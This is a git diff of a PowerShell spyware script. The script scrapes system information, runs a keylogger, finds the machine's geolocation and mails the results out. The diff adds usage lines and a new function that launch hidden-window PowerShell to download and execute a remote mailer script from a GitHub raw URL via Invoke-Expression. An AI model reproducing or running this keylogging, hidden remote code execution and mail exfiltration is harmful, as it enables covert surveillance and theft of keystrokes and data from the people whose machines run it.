@@ -20,7 +20,9 @@ FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 USE 
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')
 ########## OR #############
+### This line does not work
 powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"
+powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/mailer.ps1')"
 
 
 .USEFUL	
@@ -37,7 +39,7 @@ https://stackoverflow.com/questions/21590719/check-if-user-is-a-member-of-the-lo
 
 #>
 
-### Add information to resultsgithub
+### Add information to results github
 function Main(){
 $results = "RESULTS `n"
 #initialize
@@ -46,7 +48,8 @@ $results = nonAdministrativeScrapperFunctions
 $results += keyLogger
 $results += findGeoLocation
 mail $results
-createMailerToMailKeyloggerResults
+createNewMailer
+#createMailerToMailKeyloggerResults
 }
 
 function debug(){
@@ -471,6 +474,11 @@ function mail($messageBody){
 	###Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -windowstyle hidden -nologo -command $scriptBlock"
 	$results += "`n"
 	$results
+}
+
+#Spitted mailer and ported the mailer script to github
+function createNewMailer(){
+powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/mailer.ps1')"
 }
 
 ### Strict mode is scoped.
